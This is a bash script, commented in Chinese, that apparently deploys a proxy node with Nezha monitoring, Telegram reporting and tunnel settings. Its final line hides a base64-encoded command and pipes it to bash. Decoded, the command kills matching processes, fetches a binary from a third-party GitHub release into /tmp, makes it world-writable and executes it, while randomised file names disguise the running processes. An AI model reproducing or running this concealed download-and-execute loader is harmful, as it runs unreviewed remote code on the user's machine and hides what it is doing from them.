#!/bin/bash
 
# 隧道相关设置（去掉下面变量前面#启用，否则使用临时隧道）
# export TOK=${TOK:-''} 
# export DOM=${DOM:-''} 

# 哪吒相关设置
export NSERVER=${NSERVER:-''}
export NKEY=${NKEY:-''}

# Telegram配置 - 格式: "CHAT_ID BOT_TOKEN"
export TG=${TG:-''}

# 节点相关设置
export XIEYI=${XIEYI:-'vms'}  # 节点类型,可选vls,vms,rel
export VL_PORT=${VL_PORT:-'8002'}   # vles 端口
export VM_PORT=${VM_PORT:-'8001'} # vmes 端口
export SUB_NAME=${SUB_NAME:-'modal3'} # 节点名称
#export UUID=${UUID:-''} # 指定UUID，否则随机
#export SUB_URL='' # 订阅上传地址

# reality相关设置(不能同时开游戏)
export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}" # 端口
export SNI=${SNI:-'www.apple.com'} # tls网站

# 随机文件名
generate_random_string() {
    echo "$(tr -dc a-z </dev/urandom | head -c 1)$(tr -dc a-z0-9 </dev/urandom | head -c 4)"
}
ne_file_default="nez$(generate_random_string)"
cff_file_default="cff$(generate_random_string)"
web_file_default="web$(generate_random_string)"
export ne_file=${ne_file:-$ne_file_default} 
export cff_file=${cff_file:-$cff_file_default} 
export web_file=${web_file:-$web_file_default} 

# 启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
